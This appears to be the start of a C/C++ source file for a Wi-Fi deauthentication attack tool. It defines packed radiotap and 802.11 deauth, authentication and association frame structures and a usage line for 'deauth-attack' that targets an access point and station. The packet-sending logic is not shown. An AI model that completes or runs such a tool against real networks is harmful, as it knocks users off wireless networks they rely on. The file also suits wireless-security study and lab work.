#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdlib.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstring>
#include <thread>
#include <chrono>
#include <iomanip>

struct ieee80211_radiotap_header {
	u_int8_t        it_version = 0;     /* set to 0 */
	u_int8_t        it_pad = 0;
	u_int16_t       it_len = 8;         /* entire length */
    u_int32_t       it_present = 0;
} __attribute__((__packed__));

struct ieee80211_header {
	uint16_t frame_control;
	uint16_t duration_id = 0;
	uint8_t des[6];
	uint8_t sourceaddr4[6];
	uint8_t bssid[6];
	uint16_t sequence_control = 0;
};

struct Deauth_fixed {
    uint16_t ReasonCode;
};

struct Auth_fixed {
	uint16_t algo = 0;
	uint16_t seq = 1;
	uint16_t status = 0;
};

struct Asso_fixed {
	uint16_t cap = 0x1531;
	uint16_t interval = 0x14;
};
struct Asso_data{
	uint8_t id = 0;
	uint8_t length;
};

struct Deauth {
    struct ieee80211_radiotap_header rheader;
    struct ieee80211_header deauth;
    struct Deauth_fixed fixed;
};

struct Auth {
	struct ieee80211_radiotap_header rheader;
    struct ieee80211_header deauth;
	struct Auth_fixed fixed;
};

struct Asso {
	struct ieee80211_radiotap_header rheader;
    struct ieee80211_header deauth;
	struct Asso_fixed fixed;
	struct Asso_data data;
};

void usage() {
	printf("deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
};